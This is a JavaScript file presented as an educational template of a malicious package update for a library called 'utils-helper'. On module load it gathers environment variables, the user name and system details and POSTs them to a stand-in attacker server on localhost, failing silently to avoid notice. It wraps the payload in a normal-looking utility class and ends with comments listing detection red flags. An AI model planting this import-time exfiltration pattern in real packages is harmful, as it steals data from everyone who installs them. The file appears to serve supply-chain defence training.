/**
 * EDUCATIONAL EXAMPLE: Malicious Update Template
 * 
 * This is a template for creating a malicious package update
 * for educational purposes only.
 * 
 * Package: utils-helper
 * Version: 2.1.0 → 2.1.1 (malicious update)
 * 
 * SAFETY FEATURES:
 * - Only works when TESTBENCH_MODE=enabled
 * - Only sends data to localhost
 * - Clearly marked as malicious
 * 
 * LEARNING OBJECTIVES:
 * - Understand how malicious updates work
 * - Learn detection techniques
 * - Practice defense strategies
 */

const http = require('http');

// ============================================================================
// MALICIOUS CODE SECTION - FOR EDUCATIONAL PURPOSES ONLY
// ============================================================================

/**
 * Exfiltrate sensitive data to attacker's server
 * SAFETY: Only works in testbench mode and sends to localhost
 */
function exfiltrateData() {
  // SAFETY CHECK: Only run in testbench environment
  if (process.env.TESTBENCH_MODE !== 'enabled') {
    return;
  }

  // Collect "sensitive" data
  const dataToExfiltrate = {
    timestamp: new Date().toISOString(),
    updateVersion: '2.1.1',
    environment: {
      NODE_ENV: process.env.NODE_ENV,
      PWD: process.env.PWD,
      USER: process.env.USER,
    },
    system: {
      platform: process.platform,
      nodeVersion: process.version,
      cwd: process.cwd()
    },
    package: {
      name: 'utils-helper',
      version: '2.1.1',
      updatedAt: new Date().toISOString()
    }
  };

  // SAFETY: Only send to localhost (mock attacker server)
  const payload = JSON.stringify(dataToExfiltrate);
  const options = {
    hostname: 'localhost',
    port: 3000,
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    }
  };

  const req = http.request(options, (res) => {
    console.log('[TESTBENCH] Update data exfiltration simulated');
  });

  req.on('error', (e) => {
    // Silently fail to avoid raising suspicion
  });

  req.write(payload);
  req.end();
}

// Execute malicious payload on module load
try {
  exfiltrateData();
} catch (e) {
  // Silently catch errors
}

// ============================================================================
// LEGITIMATE CODE SECTION - Includes real bug fixes
// ============================================================================
// The update must work as expected to avoid suspicion

class UtilsHelper {
  // Include all original functionality
  // Add legitimate bug fixes
  // Add new features (to hide malicious code)
  
  static formatDate(date, format = 'YYYY-MM-DD') {
    // Original implementation
    const year = date.getFullYear();
    const month = String(date.getMonth() + 1).padStart(2, '0');
    const day = String(date.getDate()).padStart(2, '0');
    
    return format
      .replace('YYYY', year)
      .replace('MM', month)
      .replace('DD', day);
  }

  // Add more utility functions...
}

module.exports = UtilsHelper;

// ============================================================================
// DETECTION HINTS FOR LEARNERS:
// ============================================================================
// Red flags to look for:
// 1. Network requests on module load
// 2. Access to process.env
// 3. Data collection and transmission
// 4. Code execution on import
// 5. Suspicious new features
// 6. Obfuscated code
// 
// In real attacks:
// - Code would be heavily obfuscated
// - Network requests would be hidden
// - Timing attacks would be used
// - Conditional execution based on environment
// ============================================================================

